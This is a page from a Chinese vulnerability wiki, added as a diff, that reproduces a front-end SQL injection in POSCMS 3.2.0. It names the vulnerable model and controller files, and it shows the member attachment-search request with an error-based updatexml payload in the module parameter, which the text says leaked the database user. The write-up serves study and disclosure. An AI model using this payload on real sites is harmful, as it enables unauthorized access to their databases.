@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/POSCMS/POSCMS%203.2.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>POSCMS 3.2.0 前台sql注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "POSCMS 3.2.0 \u524d\u53f0sql\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        POSCMS 任意sql语句执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../POSCMS%203.2.0%20ssrf%E6%BC%8F%E6%B4%9Egetshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../POSCMS%203.2.0%20ssrf%E6%BC%8F%E6%B4%9Egetshell/" class="btn btn-xs btn-link">
+        POSCMS 3.2.0 ssrf漏洞getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="poscms-320-sql">POSCMS 3.2.0 前台sql注入漏洞<a class="headerlink" href="#poscms-320-sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>POSCMS 3.2.0</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><img alt="1.png" src="../resource/POSCMS3.2.0%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" /></p>
+<p>查看源码（<code>\diy\dayrui\models\Attachment_model.php</code>）可以发现注入点：</p>
+<p><img alt="2.png" src="../resource/POSCMS3.2.0%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
+<p>该函数的调用点位于（<code>\diy\module\member\controllers\Account.php</code>）：</p>
+<p><img alt="3.png" src="../resource/POSCMS3.2.0%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<p>对应的功能实际是前台用户中心---&gt;基本管理---&gt;附件管理的搜索功能，随便选择某个类别搜索后会看到这条请求：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/index.php?s=member&amp;c=account&amp;m=attachment&amp;module=photo&amp;ext=</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
+</code></pre></div>
+
+<p>向<code>module</code>参数注入Payload果然出现了报错：</p>
+<p><img alt="4.png" src="../resource/POSCMS3.2.0%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
+<p>但不知道为什么博客里的Payload这里复现失败了，不过已经知道是报错注入，我用了经典的Payload------<code>" or updatexml(1,concat(1,0x7e,user()),1);#</code>拼接入参数中，得到了数据库当前用户：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/index.php?s=member&amp;c=account&amp;m=attachment&amp;module=photo%22%20or%20updatexml(1,concat(1,0x7e,user()),1);%23&amp;ext=</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org</span>
+</code></pre></div>
+
+<p><img alt="5.png" src="../resource/POSCMS3.2.0%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/4858">https://xz.aliyun.com/t/4858</a>#toc-5</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../POSCMS%20%E4%BB%BB%E6%84%8Fsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        POSCMS 任意sql语句执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../POSCMS%203.2.0%20ssrf%E6%BC%8F%E6%B4%9Egetshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../POSCMS%203.2.0%20ssrf%E6%BC%8F%E6%B4%9Egetshell/" class="btn btn-xs btn-link">
+        POSCMS 3.2.0 ssrf漏洞getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
